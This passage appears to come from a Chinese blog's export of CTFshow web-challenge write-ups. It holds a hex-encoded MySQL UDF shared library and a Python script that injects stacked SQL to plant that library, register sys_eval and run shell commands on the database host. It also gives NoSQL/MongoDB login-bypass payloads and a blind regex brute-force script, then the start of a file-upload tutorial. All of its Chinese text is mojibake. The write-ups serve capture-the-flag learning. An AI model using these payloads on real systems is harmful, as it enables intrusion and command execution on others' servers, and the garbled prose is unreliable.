0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">21510</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    end <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">5000</span>    payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> t <span class="token keyword">in</span> text<span class="token punctuation">:</span>    url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select unhex('&#123;&#125;') into dumpfile '/usr/lib/mariadb/plugin/&#123;&#125;.txt'--+&amp;page=1&amp;limit=10"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        p<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>  <span class="token comment"># UDFÊèêÊùÉ‰∏ÄËà¨ÈÖçÂêàdumpfile ËÄå‰∏çÊòØoutfile</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>next_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'),load_file('/usr/lib/mariadb/plugin/e.txt')) into dumpfile '/usr/lib/mariadb/plugin/udf.so'-- +&amp;page=1&amp;limit=10"</span>  <span class="token comment"># Â∞ÜÂêÑ‰∏™txtÊñá‰ª∂ÂêàÂπ∂Âà∞udf.so</span>rn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>next_url<span class="token punctuation">)</span>uaf_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';--+"</span>  <span class="token comment"># ÂàõÂª∫udfÂáΩÊï∞</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uaf_url<span class="token punctuation">)</span>nn_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select sys_eval('cat /flag.*');-- +&amp;page=1&amp;limit=10"</span>  <span class="token comment"># ÊâßË°åÂëΩ‰ª§Âπ∂Êü•Áúã</span>rnn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>nn_url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rnn<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web249-nosql"><a href="#web249-nosql" class="headerlink" title="web249(nosql)"></a>web249(nosql)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$memcache</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><a href="https://www.anquanke.com/post/id/97211">ÂÜ∑Èó®Áü•ËØÜ ‚Äî NoSQLÊ≥®ÂÖ•Áü•Â§öÂ∞ë</a></p><p><a href="http://rui0.cn/archives/609">NoSQLÊ≥®ÂÖ•Â∞èÁ¨îËÆ∞</a></p><p><strong>Memcached get</strong> ÂëΩ‰ª§Ëé∑ÂèñÂ≠òÂÇ®Âú® <strong>key(ÈîÆ)</strong> ‰∏≠ÁöÑ <strong>value(Êï∞ÊçÆÂÄº)</strong> ÔºåÂ¶ÇÊûú key ‰∏çÂ≠òÂú®ÔºåÂàôËøîÂõûÁ©∫„ÄÇ</p><p>Ë°•ÂÖÖ‰∏Ä‰∏ãÁü•ËØÜÔºö</p><pre class="language-sql" data-language="sql"><code class="language-sql">$gt : <span class="token operator">></span>$lt : <span class="token operator">&lt;</span>$gte: <span class="token operator">>=</span>$lte: <span class="token operator">&lt;=</span>$ne : <span class="token operator">!=</span>„ÄÅ<span class="token operator">&lt;></span>$<span class="token operator">in</span> : <span class="token operator">in</span>$nin: <span class="token operator">not</span> <span class="token operator">in</span>$<span class="token keyword">all</span>: <span class="token keyword">all</span> $<span class="token operator">or</span>:<span class="token operator">or</span>$<span class="token operator">not</span>: ÂèçÂåπÈÖç<span class="token punctuation">(</span><span class="token number">1.3</span><span class="token number">.3</span>Âèä‰ª•‰∏äÁâàÊú¨<span class="token punctuation">)</span>Ê®°Á≥äÊü•ËØ¢Áî®Ê≠£ÂàôÂºèÔºödb<span class="token punctuation">.</span>customer<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">'name'</span>: &#123;<span class="token string">'$regex'</span>:<span class="token string">'.*s.*'</span>&#125; &#125;<span class="token punctuation">)</span><span class="token comment">/*** : ËåÉÂõ¥Êü•ËØ¢ &#123; "age" : &#123; "$gte" : 2 , "$lte" : 21&#125;&#125;* : $ne &#123; "age" : &#123; "$ne" : 23&#125;&#125;* : $lt &#123; "age" : &#123; "$lt" : 23&#125;&#125;*/</span><span class="token comment">//Êü•ËØ¢age = 22ÁöÑËÆ∞ÂΩï</span>db<span class="token punctuation">.</span>userInfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">"age"</span>: <span class="token number">22</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Áõ∏ÂΩì‰∫éÔºöselect * from userInfo where age = 22;</span><span class="token comment">//Êü•ËØ¢age > 22ÁöÑËÆ∞ÂΩï</span>db<span class="token punctuation">.</span>userInfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;age: &#123;$gt: <span class="token number">22</span>&#125;&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Áõ∏ÂΩì‰∫éÔºöselect * from userInfo where age > 22;</span></code></pre><p><code>id=flag</code> ‰∏çË°åÔºåid ÈÉΩÊòØÊï∞Â≠óÔºåÂ∞ùËØïÊï∞ÁªÑÁªïËøáÂæóÂà∞ flag <code>id[]=flag</code></p><h4 id="web250-MongoDB"><a href="#web250-MongoDB" class="headerlink" title="web250(MongoDB)"></a>web250(MongoDB)</h4><p>sqlËØ≠Âè•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow.ctfshow_user'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </code></pre><p>ËøîÂõûÈÄªËæë</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Êó†ËøáÊª§</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ÁôªÈôÜÊàêÂäü'</span><span class="token punctuation">;</span>  <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>MongoDBÊòØNOSQLÁöÑ‰∏ÄÁßçÔºå‰ªãÁªç‰∏Ä‰∏ãMongodbÂæó‰∏§‰∏™Êìç‰ΩúÁ¨¶Ôºö<br><code>$ne</code>Ôºö!&#x3D; ‰∏çÁ≠â‰∫é<br><code>$regex</code>ÔºöÊ≠£ÂàôÂåπÈÖç</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>username<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">.</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">.</span></code></pre><p>Â¶ÇÊûúËæìÂÖ•<code>value[$ne]=1</code>‰πüÂ∞±ÊÑèÂë≥ÁùÄ<code>value=array($ne=&gt;1)</code>ÔºåÂú®MongoDB‰∏≠ÔºåÂéüÊù•ÁöÑ‰∏Ä‰∏™Âçï‰∏™ÁõÆÊ†áÁöÑÊü•ËØ¢ÂèòÊàê‰∫ÜÊù°‰ª∂Êü•ËØ¢„ÄÇÂêåÊ†∑ÁöÑÔºåÊàë‰ª¨‰πüÂèØ‰ª•‰ΩøÁî®<code>username[$gt]=&amp;password[$gt]=</code>‰Ωú‰∏∫payloadËøõË°åÊîªÂáª„ÄÇ</p><h4 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h4><p>Âêå‰∏ä</p><h4 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//sql</span>db<span class="token punctuation">.</span>ctfshow_user<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;username:<span class="token string">'$username'</span><span class="token punctuation">,</span>password:<span class="token string">'$password'</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">.</span>pretty<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ÂêåÊó∂‰∏çËÉΩÊòØ adminÂíå admin1ÔºåÊ≠£ÂàôÁªïËøá<br>payload: <code>username[$regex]=^[^admin].*&amp;password[$ne]=1</code></p><h4 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h4><p>username&#x3D;flagÊó∂ËøîÂõûÁôªÈôÜÊàêÂäüÔºå‰ΩÜÊ≤°ÊúâÂØÜÁ†ÅÔºåËÄÉËôëÁõ≤Ê≥®ÁàÜÂá∫ÂØÜÁ†Å</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://2eb32fc2-5457-44b4-b948-b0c416a768c8.challenge.ctf.show/api/'</span>flag <span class="token operator">=</span> <span class="token string">''</span>flag_dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;&#125;1234567890-poiuytrrewqasdfghjklmnbvcxz"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_dic<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username[$regex]"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>            <span class="token string">"password[$regex]"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ÁôªÈôÜÊàêÂäü"</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag<span class="token operator">+</span>i            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> SqlÊ≥®ÂÖ• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-upload</title>
      <link href="/2024/07/02/web%E5%85%A5%E9%97%A8-upload/"/>
      <url>/2024/07/02/web%E5%85%A5%E9%97%A8-upload/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h3><p><a href="https://blog.csdn.net/qq_43390703/article/details/104858705">Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û (‰∏ä‰º†Áü•ËØÜÁÇπ„ÄÅÈ¢òÂûãÊÄªÁªìÂ§ßÂÖ®-uploadÈù∂Âú∫ÂÖ®Ëß£)</a></p><h4 id="‰∫ßÁîüÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÁöÑÂéüÂõ†"><a href="#‰∫ßÁîüÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÁöÑÂéüÂõ†" class="headerlink" title="‰∫ßÁîüÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÁöÑÂéüÂõ†"></a>‰∫ßÁîüÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÁöÑÂéüÂõ†</h4><p><strong>ÂéüÂõ†Ôºö</strong></p><ul><li>ÂØπ‰∫é‰∏ä‰º†Êñá‰ª∂ÁöÑÂêéÁºÄÂêçÔºàÊâ©Â±ïÂêçÔºâÊ≤°ÊúâÂÅöËæÉ‰∏∫‰∏•Ê†ºÁöÑÈôêÂà∂</li><li>ÂØπ‰∫é‰∏ä‰º†Êñá‰ª∂ÁöÑMIMETYPE(Áî®‰∫éÊèèËø∞Êñá‰ª∂ÁöÑÁ±ªÂûãÁöÑ‰∏ÄÁßçË°®Ëø∞ÊñπÊ≥ï) Ê≤°ÊúâÂÅöÊ£ÄÊü•</li><li>ÊùÉÈôê‰∏äÊ≤°ÊúâÂØπ‰∫é‰∏ä‰º†ÁöÑÊñá‰ª∂ÁõÆÂΩïËÆæÁΩÆ‰∏çÂèØÊâßË°åÊùÉÈôêÔºåÔºàÂ∞§ÂÖ∂ÊòØÂØπ‰∫éshebangÁ±ªÂûãÁöÑÊñá‰ª∂Ôºâ</li><li>ÂØπ‰∫éweb serverÂØπ‰∫é‰∏ä‰º†Êñá‰ª∂ÊàñËÄÖÊåáÂÆöÁõÆÂΩïÁöÑË°å‰∏∫Ê≤°ÊúâÂÅöÈôêÂà∂</li></ul><p><strong>ÂéüÁêÜÔºö</strong><br>Âú® WEB ‰∏≠ËøõË°åÊñá‰ª∂‰∏ä‰º†ÁöÑÂéüÁêÜÊòØÈÄöËøáÂ∞ÜË°®ÂçïËÆæ‰∏∫ multipart&#x2F;form-dataÔºåÂêåÊó∂Âä†ÂÖ•Êñá‰ª∂ÂüüÔºåËÄåÂêéÈÄöËøá HTTP ÂçèËÆÆÂ∞ÜÊñá‰ª∂ÂÜÖÂÆπÂèëÈÄÅÂà∞ÊúçÂä°Âô®ÔºåÊúçÂä°Âô®Á´ØËØªÂèñËøô‰∏™ÂàÜÊÆµ (multipart) ÁöÑÊï∞ÊçÆ‰ø°ÊÅØÔºåÂπ∂Â∞ÜÂÖ∂‰∏≠ÁöÑÊñá‰ª∂ÂÜÖÂÆπÊèêÂèñÂá∫Êù•Âπ∂‰øùÂ≠òÁöÑ„ÄÇÈÄöÂ∏∏ÔºåÂú®ËøõË°åÊñá‰ª∂‰øùÂ≠òÁöÑÊó∂ÂÄôÔºåÊúçÂä°Âô®Á´Ø‰ºöËØªÂèñÊñá‰ª∂ÁöÑÂéüÂßãÊñá‰ª∂ÂêçÔºåÂπ∂‰ªéËøô‰∏™ÂéüÂßãÊñá‰ª∂Âêç‰∏≠ÂæóÂá∫Êñá‰ª∂ÁöÑÊâ©Â±ïÂêçÔºåËÄåÂêéÈöèÊú∫‰∏∫Êñá‰ª∂Ëµ∑‰∏Ä‰∏™Êñá‰ª∂Âêç ( ‰∏∫‰∫ÜÈò≤Ê≠¢ÈáçÂ§ç )ÔºåÂπ∂‰∏îÂä†‰∏äÂéüÂßãÊñá‰ª∂ÁöÑÊâ©Â±ïÂêçÊù•‰øùÂ≠òÂà∞ÊúçÂä°Âô®‰∏ä</p><p>Êñá‰ª∂‰∏ä‰º†ÂêéÂØºËá¥ÁöÑÂ∏∏ËßÅÂÆâÂÖ®ÈóÆÈ¢ò‰∏ÄËà¨Êúâ:</p><ul><li><p>‰∏ä‰º†Êñá‰ª∂ÊòØWebËÑöÊú¨ËØ≠Ë®ÄÔºåÊúçÂä°Âô®ÁöÑWebÂÆπÂô®Ëß£ÈáäÂπ∂ÊâßË°å‰∫ÜÁî®Êà∑‰∏ä‰º†ÁöÑËÑöÊú¨,ÂØºËá¥‰ª£<br>Á†ÅÊâßË°å;</p></li><li><p>‰∏ä‰º†Êñá‰ª∂ÊòØFlashÁöÑÁ≠ñÁï•Êñá‰ª∂crossdomain.xml,ÈªëÂÆ¢Áî®‰ª•ÊéßÂà∂FlashÂú®ËØ•Âüü‰∏ãÁöÑË°å‰∏∫(ÂÖ∂<br>‰ªñÈÄöËøáÁ±ª‰ººÊñπÂºèÊéßÂà∂Á≠ñÁï•Êñá‰ª∂ÁöÑÊÉÖÂÜµÁ±ª‰ºº);</p></li><li><p>‰∏ä‰º†Êñá‰ª∂ÊòØÁóÖÊØí„ÄÅÊú®È©¨Êñá‰ª∂ÔºåÈªëÂÆ¢Áî®‰ª•ËØ±È™óÁî®Êà∑ÊàñËÄÖÁÆ°ÁêÜÂëò‰∏ãËΩΩÊâßË°å:</p></li><li><p>‰∏ä‰º†Êñá‰ª∂ÊòØÈíìÈ±ºÂõæÁâáÊàñ‰∏∫ÂåÖÂê´‰∫ÜËÑöÊú¨ÁöÑÂõæÁâáÔºåÂú®Êüê‰∫õÁâàÊú¨ÁöÑÊµèËßàÂô®‰∏≠‰ºöË¢´‰Ωú‰∏∫ËÑöÊú¨Êâß<br>Ë°åÔºåË¢´Áî®‰∫éÈíìÈ±ºÂíåÊ¨∫ËØà„ÄÇ</p></li><li><p>Èô§Ê≠§‰πãÂ§ñÔºåËøòÊúâ‰∏Ä‰∫õ‰∏çÂ∏∏ËßÅÁöÑÂà©Áî®ÊñπÊ≥ïÔºåÊØîÂ¶ÇÂ∞Ü‰∏ä‰º†Êñá‰ª∂‰Ωú‰∏∫‰∏Ä‰∏™ÂÖ•Âè£,Ê∫¢Âá∫ÊúçÂä°Âô®ÁöÑÂêéÂè∞Â§ÑÁêÜÁ®ãÂ∫èÔºåÂ¶ÇÂõæÁâáËß£ÊûêÊ®°Âùó;ÊàñËÄÖ‰∏ä‰º†-‰∏Ä‰∏™ÂêàÊ≥ïÁöÑÊñáÊú¨Êñá‰ª∂Ôºå ÂÖ∂ÂÜÖÂÆπÂåÖÂê´‰∫ÜPHPËÑöÊú¨ÔºåÂÜçÈÄöËøá‚ÄúÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û(Local File 